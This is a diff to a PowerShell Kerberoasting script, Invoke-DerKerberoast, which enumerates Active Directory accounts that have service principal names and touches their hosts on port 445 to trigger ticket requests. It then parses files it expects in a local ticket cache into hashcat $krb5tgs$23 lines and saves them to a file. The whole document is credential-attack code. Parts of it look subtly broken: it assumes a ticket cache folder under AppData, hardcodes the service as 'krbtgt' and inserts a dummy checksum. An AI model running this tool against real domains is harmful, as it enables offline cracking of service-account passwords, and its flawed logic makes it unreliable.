@@ -11,13 +11,15 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 ########################################################################################################################################################################################
 
+
 function Invoke-DerKerberoast {
     [CmdletBinding()]
     param (
-        [string]$Domain = $env:USERDNSDOMAIN
+        [string]$Domain = $env:USERDNSDOMAIN,
+        [string]$OutputFile = "$PWD\kerberoast_hashes.txt"
     )
 
-    Write-Host "`n[*] Enumerating SPN-bearing accounts in domain $Domain..."
+    Write-Host "[*] Enumerating SPN accounts in domain $Domain..."
     $spnUsers = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
 
     if ($spnUsers.Count -eq 0) {
@@ -30,8 +32,12 @@ function Invoke-DerKerberoast {
         foreach ($spn in $user.ServicePrincipalName) {
             Write-Host "[+] $($user.SamAccountName)   SPN: $spn"
             try {
+                # Attempt TCP connection to service host to force TGS request
                 $targetHost = $spn.Split('/')[1]
-                $null = New-Object System.Net.Sockets.TcpClient($targetHost, 445)
+                Write-Verbose "Trying TCP 445 to $targetHost ..."
+                $tcpClient = New-Object System.Net.Sockets.TcpClient
+                $tcpClient.Connect($targetHost, 445)
+                $tcpClient.Dispose()
                 $requestedSpns += [PSCustomObject]@{
                     User = $user.SamAccountName
                     SPN  = $spn
@@ -43,30 +49,54 @@ function Invoke-DerKerberoast {
         }
     }
 
-    # analyze tickets
-    Write-Host "`n[*] Checking ticket cache..."
-    $krbCache = "$env:USERPROFILE\AppData\Local\Microsoft\Windows\Kerberos\Cache"
-    if (-not (Test-Path $krbCache)) {
-        Write-Warning "Kerberos cache folder not found."
+    if ($requestedSpns.Count -eq 0) {
+        Write-Warning "No TGS requests were made, exiting."
         return
     }
 
-    Get-ChildItem $krbCache | ForEach-Object {
+    Write-Host "`n[*] Parsing Kerberos ticket cache..."
+
+    $krbCachePath = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Windows\Kerberos\Cache"
+    if (-not (Test-Path $krbCachePath)) {
+        Write-Warning "Kerberos ticket cache folder not found at $krbCachePath"
+        return
+    }
+
+    $tickets = Get-ChildItem -Path $krbCachePath -File
+    if ($tickets.Count -eq 0) {
+        Write-Warning "No tickets found in cache."
+        return
+    }
+
+    $hashcatLines = @()
+
+    foreach ($ticket in $tickets) {
+        Write-Verbose "Parsing ticket file $($ticket.Name)..."
         try {
-            $ticketBytes = [System.IO.File]::ReadAllBytes($_.FullName)
+            $ticketBytes = [System.IO.File]::ReadAllBytes($ticket.FullName)
             $parsed = Parse-Asn1 -Data $ticketBytes
             $hash = Convert-TicketToHashcat -Parsed $parsed
             if ($hash) {
-                Write-Host "`n[*] Hashcat line:"
-                Write-Host $hash
+                Write-Host "[*] Hashcat line:`n$hash`n"
+                $hashcatLines += $hash
+            }
+            else {
+                Write-Verbose "No valid hash found in $($ticket.Name)."
             }
         }
         catch {
-            Write-Warning "Could not parse $($_.FullName): $_"
+            Write-Warning "Failed parsing $($ticket.Name): $_"
         }
     }
 
-    Write-Host "`n[*] Finished. Requested $($requestedSpns.Count) TGS tickets."
+    if ($hashcatLines.Count -gt 0) {
+        Write-Host "[*] Saving all hashes to file: $OutputFile"
+        $hashcatLines | Out-File -FilePath $OutputFile -Encoding ascii
+        Write-Host "[*] Done."
+    }
+    else {
+        Write-Warning "No hashes extracted from tickets."
+    }
 }
 
 function Parse-Asn1 {
@@ -74,7 +104,6 @@ function Parse-Asn1 {
     param(
         [byte[]]$Data
     )
-
     $pos = 0
     return Parse-TLV -Data $Data -Position ([ref]$pos)
 }
@@ -86,31 +115,41 @@ function Parse-TLV {
     )
     $items = @()
     while ($Position.Value -lt $Data.Length) {
+        if ($Position.Value -ge $Data.Length) { break }
         $tag = $Data[$Position.Value]
         $Position.Value++
+        if ($Position.Value -ge $Data.Length) { break }
+
         $length = $Data[$Position.Value]
         $Position.Value++
         if ($length -gt 127) {
             $numlen = $length - 128
+            if ($Position.Value + $numlen - 1 -ge $Data.Length) { break }
             $lenBytes = $Data[$Position.Value..($Position.Value + $numlen - 1)]
             $Position.Value += $numlen
-            $length = [BitConverter]::ToInt32($lenBytes + (0,0,0)[0..(4 - $numlen)], 0)
+            # convert big endian length
+            $length = 0
+            foreach ($b in $lenBytes) {
+                $length = ($length * 256) + $b
+            }
         }
+
+        if ($Position.Value + $length - 1 -ge $Data.Length) { break }
         $value = $Data[$Position.Value..($Position.Value + $length - 1)]
         $Position.Value += $length
 
-        # parse nested sequence
-        if ($tag -band 0x20) {
+        # Check if constructed type (bit 6 set = 0x20)
+        if (($tag -band 0x20) -eq 0x20) {
             $nestedPos = 0
             $nested = Parse-TLV -Data $value -Position ([ref]$nestedPos)
             $items += [PSCustomObject]@{
-                Tag   = $tag
+                Tag = $tag
                 Value = $nested
             }
         }
         else {
             $items += [PSCustomObject]@{
-                Tag   = $tag
+                Tag = $tag
                 Value = $value
             }
         }
@@ -122,27 +161,35 @@ function Convert-TicketToHashcat {
     param(
         $Parsed
     )
-
-    # search the parsed tree for bits we want
+    # Flatten the parsed TLV tree
     $flat = Flatten-TLV $Parsed
 
-    $username = ($flat | Where-Object { $_.Tag -eq 0x1b -or $_.Tag -eq 0x1c } | Select-Object -First 1).Value
-    $realm = ($flat | Where-Object { $_.Tag -eq 0x1b -or $_.Tag -eq 0x1c } | Select-Object -Last 1).Value
-    $encBlob = ($flat | Where-Object { $_.Tag -eq 0x04 } | Select-Object -Last 1).Value
+    # Attempt to extract user and realm strings
+    $userBytes = ($flat | Where-Object { $_.Tag -eq 0x1b -or $_.Tag -eq 0x1c } | Select-Object -First 1).Value
+    $realmBytes = ($flat | Where-Object { $_.Tag -eq 0x1b -or $_.Tag -eq 0x1c } | Select-Object -Last 1).Value
+    $encBytes = ($flat | Where-Object { $_.Tag -eq 0x04 } | Select-Object -Last 1).Value
 
-    if ($null -eq $username -or $null -eq $encBlob) {
-        Write-Warning "Failed to identify user or ciphertext."
+    if (-not $userBytes -or -not $encBytes) {
+        Write-Verbose "Unable to locate necessary user or encrypted data in ticket."
         return $null
     }
 
-    $userStr = [System.Text.Encoding]::ASCII.GetString($username)
-    $realmStr = [System.Text.Encoding]::ASCII.GetString($realm)
-    $encHex = ($encBlob | ForEach-Object { $_.ToString("x2") }) -join ""
-    $service = "krbtgt"
+    try {
+        $userStr = [System.Text.Encoding]::ASCII.GetString($userBytes)
+        $realmStr = if ($realmBytes) { [System.Text.Encoding]::ASCII.GetString($realmBytes) } else { "UNKNOWN" }
+        $encHex = ($encBytes | ForEach-Object { $_.ToString("x2") }) -join ""
 
-    $checksum = "1122334455667788"
+        # Compose a simplified hashcat TGS-REP line format:
+        # $krb5tgs$23$*user$realm$service$checksum$enc
+        $service = "krbtgt"
+        $checksum = "1122334455667788" # dummy checksum placeholder
 
-    return "\$krb5tgs\$23\$*$userStr*$realmStr*$service*$checksum\$$encHex"
+        return "\$krb5tgs\$23\$*$userStr*$realmStr*$service*$checksum\$$encHex"
+    }
+    catch {
+        Write-Verbose "Error converting ticket to hashcat line: $_"
+        return $null
+    }
 }
 
 function Flatten-TLV {
@@ -152,7 +199,7 @@ function Flatten-TLV {
     $flat = @()
     foreach ($i in $Items) {
         if ($i.Value -is [System.Collections.IEnumerable] -and
-            $i.Value -notmatch "System\.Byte") {
+            $i.Value -isnot [byte[]]) {
             $flat += Flatten-TLV $i.Value
         }
         else {
@@ -162,7 +209,16 @@ function Flatten-TLV {
     return $flat
 }
 
-# usage
-# . .\Invoke-DerKerberoast.ps1
-# Invoke-DerKerberoast
+# Allow verbose output for debug
+$VerbosePreference = "Continue"
 
+
+#Usage
+# Load script (dot-source)
+#. .\Invoke-DerKerberoast.ps1
+
+# Run with defaults
+#Invoke-DerKerberoast
+
+# Or specify domain and output file path
+#Invoke-DerKerberoast -Domain "corp.example.com" -OutputFile "C:\temp\hashes.txt"
